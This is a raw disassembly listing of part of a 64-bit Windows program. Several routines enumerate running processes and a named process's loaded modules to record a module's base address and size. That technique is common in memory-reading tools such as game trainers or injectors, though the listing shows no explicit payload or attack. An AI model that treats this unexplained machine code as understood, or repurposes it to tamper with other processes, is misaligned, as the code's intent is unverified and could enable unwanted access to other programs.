   1400039fd:	48 8b ca             	mov    %rdx,%rcx
   140003a00:	4c 8d 4c 24 24       	lea    0x24(%rsp),%r9
   140003a05:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   140003a0c:	00 00 00 00 
   140003a10:	41 0f b6 04 08       	movzbl (%r8,%rcx,1),%eax
   140003a15:	48 ff c1             	inc    %rcx
   140003a18:	41 3a 44 09 ff       	cmp    -0x1(%r9,%rcx,1),%al
   140003a1d:	75 08                	jne    0x140003a27
   140003a1f:	48 83 f9 04          	cmp    $0x4,%rcx
   140003a23:	75 eb                	jne    0x140003a10
   140003a25:	eb 05                	jmp    0x140003a2c
   140003a27:	1b d2                	sbb    %edx,%edx
   140003a29:	83 ca 01             	or     $0x1,%edx
   140003a2c:	85 d2                	test   %edx,%edx
   140003a2e:	75 0d                	jne    0x140003a3d
   140003a30:	48 8d 1c 9d 00 00 00 	lea    0x0(,%rbx,4),%rbx
   140003a37:	00 
   140003a38:	4c 8b c3             	mov    %rbx,%r8
   140003a3b:	eb 14                	jmp    0x140003a51
   140003a3d:	48 85 db             	test   %rbx,%rbx
   140003a40:	74 1c                	je     0x140003a5e
   140003a42:	48 8d 1c 9d 00 00 00 	lea    0x0(,%rbx,4),%rbx
   140003a49:	00 
   140003a4a:	4c 8b c3             	mov    %rbx,%r8
   140003a4d:	49 83 e0 fc          	and    $0xfffffffffffffffc,%r8
   140003a51:	33 d2                	xor    %edx,%edx
   140003a53:	48 8b ce             	mov    %rsi,%rcx
   140003a56:	e8 f5 5b 00 00       	call   0x140009650
   140003a5b:	48 03 f3             	add    %rbx,%rsi
   140003a5e:	48 89 77 08          	mov    %rsi,0x8(%rdi)
   140003a62:	48 8b 57 18          	mov    0x18(%rdi),%rdx
   140003a66:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140003a6b:	48 85 d2             	test   %rdx,%rdx
   140003a6e:	75 21                	jne    0x140003a91
   140003a70:	48 8d 04 2a          	lea    (%rdx,%rbp,1),%rax
   140003a74:	48 89 47 18          	mov    %rax,0x18(%rdi)
   140003a78:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003a7d:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   140003a82:	49 8b c6             	mov    %r14,%rax
   140003a85:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140003a8a:	48 83 c4 30          	add    $0x30,%rsp
   140003a8e:	41 5e                	pop    %r14
   140003a90:	c3                   	ret
   140003a91:	4c 8b 1f             	mov    (%rdi),%r11
   140003a94:	48 85 d2             	test   %rdx,%rdx
   140003a97:	79 22                	jns    0x140003abb
   140003a99:	48 8b c2             	mov    %rdx,%rax
   140003a9c:	48 f7 d8             	neg    %rax
   140003a9f:	74 1a                	je     0x140003abb
   140003aa1:	48 8b c2             	mov    %rdx,%rax
   140003aa4:	4d 8b cb             	mov    %r11,%r9
   140003aa7:	48 f7 d0             	not    %rax
   140003aaa:	48 c1 e8 05          	shr    $0x5,%rax
   140003aae:	48 8d 04 85 04 00 00 	lea    0x4(,%rax,4),%rax
   140003ab5:	00 
   140003ab6:	4c 2b c8             	sub    %rax,%r9
   140003ab9:	eb 0b                	jmp    0x140003ac6
   140003abb:	48 8b c2             	mov    %rdx,%rax
   140003abe:	48 c1 e8 05          	shr    $0x5,%rax
   140003ac2:	4d 8d 0c 83          	lea    (%r11,%rax,4),%r9
   140003ac6:	48 8b ca             	mov    %rdx,%rcx
   140003ac9:	83 e1 1f             	and    $0x1f,%ecx
   140003acc:	48 03 d5             	add    %rbp,%rdx
   140003acf:	48 89 57 18          	mov    %rdx,0x18(%rdi)
   140003ad3:	79 22                	jns    0x140003af7
   140003ad5:	48 8b c2             	mov    %rdx,%rax
   140003ad8:	48 f7 d8             	neg    %rax
   140003adb:	74 1a                	je     0x140003af7
   140003add:	48 8b c2             	mov    %rdx,%rax
   140003ae0:	4d 8b d3             	mov    %r11,%r10
   140003ae3:	48 f7 d0             	not    %rax
   140003ae6:	48 c1 e8 05          	shr    $0x5,%rax
   140003aea:	48 8d 04 85 04 00 00 	lea    0x4(,%rax,4),%rax
   140003af1:	00 
   140003af2:	4c 2b d0             	sub    %rax,%r10
   140003af5:	eb 0b                	jmp    0x140003b02
   140003af7:	48 8b c2             	mov    %rdx,%rax
   140003afa:	48 c1 e8 05          	shr    $0x5,%rax
   140003afe:	4d 8d 14 83          	lea    (%r11,%rax,4),%r10
   140003b02:	83 e2 1f             	and    $0x1f,%edx
   140003b05:	4d 85 f6             	test   %r14,%r14
   140003b08:	79 1f                	jns    0x140003b29
   140003b0a:	49 8b c6             	mov    %r14,%rax
   140003b0d:	48 f7 d8             	neg    %rax
   140003b10:	74 17                	je     0x140003b29
   140003b12:	49 8b c6             	mov    %r14,%rax
   140003b15:	48 f7 d0             	not    %rax
   140003b18:	48 c1 e8 05          	shr    $0x5,%rax
   140003b1c:	48 8d 04 85 04 00 00 	lea    0x4(,%rax,4),%rax
   140003b23:	00 
   140003b24:	4c 2b d8             	sub    %rax,%r11
   140003b27:	eb 0b                	jmp    0x140003b34
   140003b29:	49 8b c6             	mov    %r14,%rax
   140003b2c:	48 c1 e8 05          	shr    $0x5,%rax
   140003b30:	4d 8d 1c 83          	lea    (%r11,%rax,4),%r11
   140003b34:	bf 1f 00 00 00       	mov    $0x1f,%edi
   140003b39:	49 8b c6             	mov    %r14,%rax
   140003b3c:	48 23 f8             	and    %rax,%rdi
   140003b3f:	90                   	nop
   140003b40:	48 8b da             	mov    %rdx,%rbx
   140003b43:	4c 8b c1             	mov    %rcx,%r8
   140003b46:	4d 3b d9             	cmp    %r9,%r11
   140003b49:	75 09                	jne    0x140003b54
   140003b4b:	48 3b f9             	cmp    %rcx,%rdi
   140003b4e:	0f 84 24 ff ff ff    	je     0x140003a78
   140003b54:	48 85 c9             	test   %rcx,%rcx
   140003b57:	74 05                	je     0x140003b5e
   140003b59:	48 ff c9             	dec    %rcx
   140003b5c:	eb 05                	jmp    0x140003b63
   140003b5e:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   140003b63:	4d 85 c0             	test   %r8,%r8
   140003b66:	49 8d 41 fc          	lea    -0x4(%r9),%rax
   140003b6a:	4c 0f 44 c8          	cmove  %rax,%r9
   140003b6e:	48 85 d2             	test   %rdx,%rdx
   140003b71:	74 05                	je     0x140003b78
   140003b73:	48 ff ca             	dec    %rdx
   140003b76:	eb 05                	jmp    0x140003b7d
   140003b78:	ba 1f 00 00 00       	mov    $0x1f,%edx
   140003b7d:	48 85 db             	test   %rbx,%rbx
   140003b80:	49 8d 42 fc          	lea    -0x4(%r10),%rax
   140003b84:	4c 0f 44 d0          	cmove  %rax,%r10
   140003b88:	b8 01 00 00 00       	mov    $0x1,%eax
   140003b8d:	d3 e0                	shl    %cl,%eax
   140003b8f:	45 8b 02             	mov    (%r10),%r8d
   140003b92:	41 85 01             	test   %eax,(%r9)
   140003b95:	74 09                	je     0x140003ba0
   140003b97:	41 0f ab d0          	bts    %edx,%r8d
   140003b9b:	45 89 02             	mov    %r8d,(%r10)
   140003b9e:	eb a0                	jmp    0x140003b40
   140003ba0:	41 0f b3 d0          	btr    %edx,%r8d
   140003ba4:	45 89 02             	mov    %r8d,(%r10)
   140003ba7:	eb 97                	jmp    0x140003b40
   140003ba9:	e8 72 00 00 00       	call   0x140003c20
   140003bae:	cc                   	int3
   140003baf:	cc                   	int3
   140003bb0:	40 53                	rex push %rbx
   140003bb2:	48 83 ec 30          	sub    $0x30,%rsp
   140003bb6:	48 8b d9             	mov    %rcx,%rbx
   140003bb9:	48 8b 09             	mov    (%rcx),%rcx
   140003bbc:	48 85 c9             	test   %rcx,%rcx
   140003bbf:	74 3a                	je     0x140003bfb
   140003bc1:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   140003bc5:	48 2b d1             	sub    %rcx,%rdx
   140003bc8:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003bcf:	72 18                	jb     0x140003be9
   140003bd1:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140003bd5:	48 83 c2 27          	add    $0x27,%rdx
   140003bd9:	48 2b c8             	sub    %rax,%rcx
   140003bdc:	48 83 e9 08          	sub    $0x8,%rcx
   140003be0:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140003be4:	77 1b                	ja     0x140003c01
   140003be6:	48 8b c8             	mov    %rax,%rcx
   140003be9:	e8 ea 4b 00 00       	call   0x1400087d8
   140003bee:	33 c0                	xor    %eax,%eax
   140003bf0:	48 89 03             	mov    %rax,(%rbx)
   140003bf3:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140003bf7:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140003bfb:	48 83 c4 30          	add    $0x30,%rsp
   140003bff:	5b                   	pop    %rbx
   140003c00:	c3                   	ret
   140003c01:	33 c0                	xor    %eax,%eax
   140003c03:	45 33 c9             	xor    %r9d,%r9d
   140003c06:	45 33 c0             	xor    %r8d,%r8d
   140003c09:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003c0e:	33 d2                	xor    %edx,%edx
   140003c10:	33 c9                	xor    %ecx,%ecx
   140003c12:	ff 15 50 68 00 00    	call   *0x6850(%rip)        # 0x14000a468
   140003c18:	cc                   	int3
   140003c19:	cc                   	int3
   140003c1a:	cc                   	int3
   140003c1b:	cc                   	int3
   140003c1c:	cc                   	int3
   140003c1d:	cc                   	int3
   140003c1e:	cc                   	int3
   140003c1f:	cc                   	int3
   140003c20:	48 83 ec 28          	sub    $0x28,%rsp
   140003c24:	48 8d 0d cd 6d 00 00 	lea    0x6dcd(%rip),%rcx        # 0x14000a9f8
   140003c2b:	e8 c9 4a 00 00       	call   0x1400086f9
   140003c30:	cc                   	int3
   140003c31:	cc                   	int3
   140003c32:	cc                   	int3
   140003c33:	cc                   	int3
   140003c34:	cc                   	int3
   140003c35:	cc                   	int3
   140003c36:	cc                   	int3
   140003c37:	cc                   	int3
   140003c38:	cc                   	int3
   140003c39:	cc                   	int3
   140003c3a:	cc                   	int3
   140003c3b:	cc                   	int3
   140003c3c:	cc                   	int3
   140003c3d:	cc                   	int3
   140003c3e:	cc                   	int3
   140003c3f:	cc                   	int3
   140003c40:	40 53                	rex push %rbx
   140003c42:	48 83 ec 60          	sub    $0x60,%rsp
   140003c46:	48 8b 05 73 ef 00 00 	mov    0xef73(%rip),%rax        # 0x140012bc0
   140003c4d:	48 33 c4             	xor    %rsp,%rax
   140003c50:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140003c55:	48 8b d9             	mov    %rcx,%rbx
   140003c58:	48 8d 15 59 6d 00 00 	lea    0x6d59(%rip),%rdx        # 0x14000a9b8
   140003c5f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003c64:	e8 c7 01 00 00       	call   0x140003e30
   140003c69:	48 8b d0             	mov    %rax,%rdx
   140003c6c:	48 8b cb             	mov    %rbx,%rcx
   140003c6f:	e8 0c fc ff ff       	call   0x140003880
   140003c74:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003c79:	e8 02 e0 ff ff       	call   0x140001c80
   140003c7e:	48 8b 03             	mov    (%rbx),%rax
   140003c81:	48 85 c0             	test   %rax,%rax
   140003c84:	74 4a                	je     0x140003cd0
   140003c86:	48 89 05 73 e3 00 00 	mov    %rax,0xe373(%rip)        # 0x140012000
   140003c8d:	48 8d 53 10          	lea    0x10(%rbx),%rdx
   140003c91:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140003c95:	48 8d 0d 74 e3 00 00 	lea    0xe374(%rip),%rcx        # 0x140012010
   140003c9c:	48 89 05 65 e3 00 00 	mov    %rax,0xe365(%rip)        # 0x140012008
   140003ca3:	48 3b ca             	cmp    %rdx,%rcx
   140003ca6:	74 13                	je     0x140003cbb
   140003ca8:	48 83 7a 18 0f       	cmpq   $0xf,0x18(%rdx)
   140003cad:	4c 8b 42 10          	mov    0x10(%rdx),%r8
   140003cb1:	76 03                	jbe    0x140003cb6
   140003cb3:	48 8b 12             	mov    (%rdx),%rdx
   140003cb6:	e8 85 e0 ff ff       	call   0x140001d40
   140003cbb:	b0 01                	mov    $0x1,%al
   140003cbd:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140003cc2:	48 33 cc             	xor    %rsp,%rcx
   140003cc5:	e8 a6 4b 00 00       	call   0x140008870
   140003cca:	48 83 c4 60          	add    $0x60,%rsp
   140003cce:	5b                   	pop    %rbx
   140003ccf:	c3                   	ret
   140003cd0:	48 8d 0d f9 6c 00 00 	lea    0x6cf9(%rip),%rcx        # 0x14000a9d0
   140003cd7:	48 89 7c 24 78       	mov    %rdi,0x78(%rsp)
   140003cdc:	e8 6f 02 00 00       	call   0x140003f50
   140003ce1:	8b f8                	mov    %eax,%edi
   140003ce3:	85 c0                	test   %eax,%eax
   140003ce5:	75 28                	jne    0x140003d0f
   140003ce7:	48 8d 0d ca 6c 00 00 	lea    0x6cca(%rip),%rcx        # 0x14000a9b8
   140003cee:	e8 5d 02 00 00       	call   0x140003f50
   140003cf3:	8b f8                	mov    %eax,%edi
   140003cf5:	85 c0                	test   %eax,%eax
   140003cf7:	75 16                	jne    0x140003d0f
   140003cf9:	48 8d 0d e8 6c 00 00 	lea    0x6ce8(%rip),%rcx        # 0x14000a9e8
   140003d00:	e8 4b 02 00 00       	call   0x140003f50
   140003d05:	8b f8                	mov    %eax,%edi
   140003d07:	85 c0                	test   %eax,%eax
   140003d09:	0f 84 84 00 00 00    	je     0x140003d93
   140003d0f:	4c 8d 05 ba 6c 00 00 	lea    0x6cba(%rip),%r8        # 0x14000a9d0
   140003d16:	8b d7                	mov    %edi,%edx
   140003d18:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003d1d:	e8 ee 02 00 00       	call   0x140004010
   140003d22:	48 8b d0             	mov    %rax,%rdx
   140003d25:	48 8b cb             	mov    %rbx,%rcx
   140003d28:	e8 53 fb ff ff       	call   0x140003880
   140003d2d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003d32:	e8 49 df ff ff       	call   0x140001c80
   140003d37:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   140003d3b:	75 7d                	jne    0x140003dba
   140003d3d:	4c 8d 05 74 6c 00 00 	lea    0x6c74(%rip),%r8        # 0x14000a9b8
   140003d44:	8b d7                	mov    %edi,%edx
   140003d46:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003d4b:	e8 c0 02 00 00       	call   0x140004010
   140003d50:	48 8b d0             	mov    %rax,%rdx
   140003d53:	48 8b cb             	mov    %rbx,%rcx
   140003d56:	e8 25 fb ff ff       	call   0x140003880
   140003d5b:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003d60:	e8 1b df ff ff       	call   0x140001c80
   140003d65:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   140003d69:	75 4f                	jne    0x140003dba
   140003d6b:	4c 8d 05 76 6c 00 00 	lea    0x6c76(%rip),%r8        # 0x14000a9e8
   140003d72:	8b d7                	mov    %edi,%edx
   140003d74:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003d79:	e8 92 02 00 00       	call   0x140004010
   140003d7e:	48 8b d0             	mov    %rax,%rdx
   140003d81:	48 8b cb             	mov    %rbx,%rcx
   140003d84:	e8 f7 fa ff ff       	call   0x140003880
   140003d89:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003d8e:	e8 ed de ff ff       	call   0x140001c80
   140003d93:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   140003d97:	75 21                	jne    0x140003dba
   140003d99:	33 d2                	xor    %edx,%edx
   140003d9b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003da0:	e8 8b 00 00 00       	call   0x140003e30
   140003da5:	48 8b d0             	mov    %rax,%rdx
   140003da8:	48 8b cb             	mov    %rbx,%rcx
   140003dab:	e8 d0 fa ff ff       	call   0x140003880
   140003db0:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003db5:	e8 c6 de ff ff       	call   0x140001c80
   140003dba:	48 8b 03             	mov    (%rbx),%rax
   140003dbd:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140003dc2:	48 85 c0             	test   %rax,%rax
   140003dc5:	74 35                	je     0x140003dfc
   140003dc7:	48 89 05 32 e2 00 00 	mov    %rax,0xe232(%rip)        # 0x140012000
   140003dce:	48 8d 53 10          	lea    0x10(%rbx),%rdx
   140003dd2:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140003dd6:	48 8d 0d 33 e2 00 00 	lea    0xe233(%rip),%rcx        # 0x140012010
   140003ddd:	48 89 05 24 e2 00 00 	mov    %rax,0xe224(%rip)        # 0x140012008
   140003de4:	48 3b ca             	cmp    %rdx,%rcx
   140003de7:	74 13                	je     0x140003dfc
   140003de9:	48 83 7a 18 0f       	cmpq   $0xf,0x18(%rdx)
   140003dee:	4c 8b 42 10          	mov    0x10(%rdx),%r8
   140003df2:	76 03                	jbe    0x140003df7
   140003df4:	48 8b 12             	mov    (%rdx),%rdx
   140003df7:	e8 44 df ff ff       	call   0x140001d40
   140003dfc:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   140003e00:	74 0b                	je     0x140003e0d
   140003e02:	48 83 7b 08 00       	cmpq   $0x0,0x8(%rbx)
   140003e07:	0f 85 ae fe ff ff    	jne    0x140003cbb
   140003e0d:	32 c0                	xor    %al,%al
   140003e0f:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140003e14:	48 33 cc             	xor    %rsp,%rcx
   140003e17:	e8 54 4a 00 00       	call   0x140008870
   140003e1c:	48 83 c4 60          	add    $0x60,%rsp
   140003e20:	5b                   	pop    %rbx
   140003e21:	c3                   	ret
   140003e22:	cc                   	int3
   140003e23:	cc                   	int3
   140003e24:	cc                   	int3
   140003e25:	cc                   	int3
   140003e26:	cc                   	int3
   140003e27:	cc                   	int3
   140003e28:	cc                   	int3
   140003e29:	cc                   	int3
   140003e2a:	cc                   	int3
   140003e2b:	cc                   	int3
   140003e2c:	cc                   	int3
   140003e2d:	cc                   	int3
   140003e2e:	cc                   	int3
   140003e2f:	cc                   	int3
   140003e30:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140003e35:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003e3a:	57                   	push   %rdi
   140003e3b:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140003e42:	48 8b 05 77 ed 00 00 	mov    0xed77(%rip),%rax        # 0x140012bc0
   140003e49:	48 33 c4             	xor    %rsp,%rax
   140003e4c:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140003e51:	48 8b f2             	mov    %rdx,%rsi
   140003e54:	48 8b f9             	mov    %rcx,%rdi
   140003e57:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003e5c:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003e5f:	0f 11 44 24 48       	movups %xmm0,0x48(%rsp)
   140003e64:	0f 57 c9             	xorps  %xmm1,%xmm1
   140003e67:	0f 11 4c 24 58       	movups %xmm1,0x58(%rsp)
   140003e6c:	66 0f 6f 05 fc 6a 00 	movdqa 0x6afc(%rip),%xmm0        # 0x14000a970
   140003e73:	00 
   140003e74:	f3 0f 7f 44 24 68    	movdqu %xmm0,0x68(%rsp)
   140003e7a:	c6 44 24 58 00       	movb   $0x0,0x58(%rsp)
   140003e7f:	48 8b ca             	mov    %rdx,%rcx
   140003e82:	ff 15 a0 61 00 00    	call   *0x61a0(%rip)        # 0x14000a028
   140003e88:	48 8b d8             	mov    %rax,%rbx
   140003e8b:	48 85 c0             	test   %rax,%rax
   140003e8e:	75 11                	jne    0x140003ea1
   140003e90:	48 8b ce             	mov    %rsi,%rcx
   140003e93:	ff 15 97 61 00 00    	call   *0x6197(%rip)        # 0x14000a030
   140003e99:	48 8b d8             	mov    %rax,%rbx
   140003e9c:	48 85 c0             	test   %rax,%rax
   140003e9f:	74 59                	je     0x140003efa
   140003ea1:	ff 15 61 61 00 00    	call   *0x6161(%rip)        # 0x14000a008
   140003ea7:	48 8b c8             	mov    %rax,%rcx
   140003eaa:	41 b9 18 00 00 00    	mov    $0x18,%r9d
   140003eb0:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140003eb5:	48 8b d3             	mov    %rbx,%rdx
   140003eb8:	e8 18 48 00 00       	call   0x1400086d5
   140003ebd:	85 c0                	test   %eax,%eax
   140003ebf:	74 39                	je     0x140003efa
   140003ec1:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140003ec6:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140003ecb:	8b 44 24 38          	mov    0x38(%rsp),%eax
   140003ecf:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140003ed4:	48 8d 1d d5 6a 00 00 	lea    0x6ad5(%rip),%rbx        # 0x14000a9b0
   140003edb:	48 85 f6             	test   %rsi,%rsi
   140003ede:	48 0f 45 de          	cmovne %rsi,%rbx
   140003ee2:	48 8b cb             	mov    %rbx,%rcx
   140003ee5:	e8 7e 57 00 00       	call   0x140009668
   140003eea:	4c 8b c0             	mov    %rax,%r8
   140003eed:	48 8b d3             	mov    %rbx,%rdx
   140003ef0:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140003ef5:	e8 46 de ff ff       	call   0x140001d40
   140003efa:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003eff:	48 89 0f             	mov    %rcx,(%rdi)
   140003f02:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140003f07:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
   140003f0b:	0f 10 44 24 58       	movups 0x58(%rsp),%xmm0
   140003f10:	0f 11 47 10          	movups %xmm0,0x10(%rdi)
   140003f14:	0f 10 4c 24 68       	movups 0x68(%rsp),%xmm1
   140003f19:	0f 11 4f 20          	movups %xmm1,0x20(%rdi)
   140003f1d:	48 8b c7             	mov    %rdi,%rax
   140003f20:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140003f25:	48 33 cc             	xor    %rsp,%rcx
   140003f28:	e8 43 49 00 00       	call   0x140008870
   140003f2d:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   140003f34:	00 
   140003f35:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140003f39:	49 8b 73 28          	mov    0x28(%r11),%rsi
   140003f3d:	49 8b e3             	mov    %r11,%rsp
   140003f40:	5f                   	pop    %rdi
   140003f41:	c3                   	ret
   140003f42:	cc                   	int3
   140003f43:	cc                   	int3
   140003f44:	cc                   	int3
   140003f45:	cc                   	int3
   140003f46:	cc                   	int3
   140003f47:	cc                   	int3
   140003f48:	cc                   	int3
   140003f49:	cc                   	int3
   140003f4a:	cc                   	int3
   140003f4b:	cc                   	int3
   140003f4c:	cc                   	int3
   140003f4d:	cc                   	int3
   140003f4e:	cc                   	int3
   140003f4f:	cc                   	int3
   140003f50:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140003f55:	57                   	push   %rdi
   140003f56:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   140003f5d:	48 8b 05 5c ec 00 00 	mov    0xec5c(%rip),%rax        # 0x140012bc0
   140003f64:	48 33 c4             	xor    %rsp,%rax
   140003f67:	48 89 84 24 50 01 00 	mov    %rax,0x150(%rsp)
   140003f6e:	00 
   140003f6f:	48 8b f9             	mov    %rcx,%rdi
   140003f72:	33 d2                	xor    %edx,%edx
   140003f74:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003f79:	e8 5d 47 00 00       	call   0x1400086db
   140003f7e:	48 8b d8             	mov    %rax,%rbx
   140003f81:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140003f85:	75 04                	jne    0x140003f8b
   140003f87:	33 c0                	xor    %eax,%eax
   140003f89:	eb 61                	jmp    0x140003fec
   140003f8b:	48 89 b4 24 78 01 00 	mov    %rsi,0x178(%rsp)
   140003f92:	00 
   140003f93:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003f98:	48 8b cb             	mov    %rbx,%rcx
   140003f9b:	c7 44 24 20 30 01 00 	movl   $0x130,0x20(%rsp)
   140003fa2:	00 
   140003fa3:	33 f6                	xor    %esi,%esi
   140003fa5:	e8 37 47 00 00       	call   0x1400086e1
   140003faa:	85 c0                	test   %eax,%eax
   140003fac:	74 2b                	je     0x140003fd9
   140003fae:	66 90                	xchg   %ax,%ax
   140003fb0:	48 8b d7             	mov    %rdi,%rdx
   140003fb3:	48 8d 4c 24 4c       	lea    0x4c(%rsp),%rcx
   140003fb8:	ff 15 72 65 00 00    	call   *0x6572(%rip)        # 0x14000a530
   140003fbe:	85 c0                	test   %eax,%eax
   140003fc0:	74 13                	je     0x140003fd5
   140003fc2:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003fc7:	48 8b cb             	mov    %rbx,%rcx
   140003fca:	e8 18 47 00 00       	call   0x1400086e7
   140003fcf:	85 c0                	test   %eax,%eax
   140003fd1:	75 dd                	jne    0x140003fb0
   140003fd3:	eb 04                	jmp    0x140003fd9
   140003fd5:	8b 74 24 28          	mov    0x28(%rsp),%esi
   140003fd9:	48 8b cb             	mov    %rbx,%rcx
   140003fdc:	ff 15 1e 60 00 00    	call   *0x601e(%rip)        # 0x14000a000
   140003fe2:	8b c6                	mov    %esi,%eax
   140003fe4:	48 8b b4 24 78 01 00 	mov    0x178(%rsp),%rsi
   140003feb:	00 
   140003fec:	48 8b 8c 24 50 01 00 	mov    0x150(%rsp),%rcx
   140003ff3:	00 
   140003ff4:	48 33 cc             	xor    %rsp,%rcx
   140003ff7:	e8 74 48 00 00       	call   0x140008870
   140003ffc:	48 8b 9c 24 80 01 00 	mov    0x180(%rsp),%rbx
   140004003:	00 
   140004004:	48 81 c4 60 01 00 00 	add    $0x160,%rsp
   14000400b:	5f                   	pop    %rdi
   14000400c:	c3                   	ret
   14000400d:	cc                   	int3
   14000400e:	cc                   	int3
   14000400f:	cc                   	int3
   140004010:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140004015:	55                   	push   %rbp
   140004016:	56                   	push   %rsi
   140004017:	57                   	push   %rdi
   140004018:	48 8d ac 24 50 fe ff 	lea    -0x1b0(%rsp),%rbp
   14000401f:	ff 
   140004020:	48 81 ec b0 02 00 00 	sub    $0x2b0,%rsp
   140004027:	48 8b 05 92 eb 00 00 	mov    0xeb92(%rip),%rax        # 0x140012bc0
   14000402e:	48 33 c4             	xor    %rsp,%rax
   140004031:	48 89 85 a0 01 00 00 	mov    %rax,0x1a0(%rbp)
   140004038:	49 8b f0             	mov    %r8,%rsi
   14000403b:	48 8b d9             	mov    %rcx,%rbx
   14000403e:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004043:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004046:	0f 11 85 70 01 00 00 	movups %xmm0,0x170(%rbp)
   14000404d:	0f 57 c9             	xorps  %xmm1,%xmm1
   140004050:	0f 11 8d 80 01 00 00 	movups %xmm1,0x180(%rbp)
   140004057:	66 0f 6f 05 11 69 00 	movdqa 0x6911(%rip),%xmm0        # 0x14000a970
   14000405e:	00 
   14000405f:	f3 0f 7f 85 90 01 00 	movdqu %xmm0,0x190(%rbp)
   140004066:	00 
   140004067:	c6 85 80 01 00 00 00 	movb   $0x0,0x180(%rbp)
   14000406e:	b9 18 00 00 00       	mov    $0x18,%ecx
   140004073:	e8 63 46 00 00       	call   0x1400086db
   140004078:	48 8b f8             	mov    %rax,%rdi
   14000407b:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000407f:	75 1a                	jne    0x14000409b
   140004081:	48 8b 8d 70 01 00 00 	mov    0x170(%rbp),%rcx
   140004088:	48 89 0b             	mov    %rcx,(%rbx)
   14000408b:	48 8b 8d 78 01 00 00 	mov    0x178(%rbp),%rcx
   140004092:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   140004096:	e9 9d 00 00 00       	jmp    0x140004138
   14000409b:	c7 44 24 30 38 02 00 	movl   $0x238,0x30(%rsp)
   1400040a2:	00 
   1400040a3:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400040a8:	48 8b cf             	mov    %rdi,%rcx
   1400040ab:	e8 3d 46 00 00       	call   0x1400086ed
   1400040b0:	85 c0                	test   %eax,%eax
   1400040b2:	74 66                	je     0x14000411a
   1400040b4:	0f 1f 40 00          	nopl   0x0(%rax)
   1400040b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400040bf:	00 
   1400040c0:	48 8b d6             	mov    %rsi,%rdx
   1400040c3:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400040c8:	ff 15 62 64 00 00    	call   *0x6462(%rip)        # 0x14000a530
   1400040ce:	85 c0                	test   %eax,%eax
   1400040d0:	74 13                	je     0x1400040e5
   1400040d2:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400040d7:	48 8b cf             	mov    %rdi,%rcx
   1400040da:	e8 14 46 00 00       	call   0x1400086f3
   1400040df:	85 c0                	test   %eax,%eax
   1400040e1:	75 dd                	jne    0x1400040c0
   1400040e3:	eb 35                	jmp    0x14000411a
   1400040e5:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   1400040ea:	48 89 85 70 01 00 00 	mov    %rax,0x170(%rbp)
   1400040f1:	8b 44 24 50          	mov    0x50(%rsp),%eax
   1400040f5:	48 89 85 78 01 00 00 	mov    %rax,0x178(%rbp)
   1400040fc:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004101:	e8 62 55 00 00       	call   0x140009668
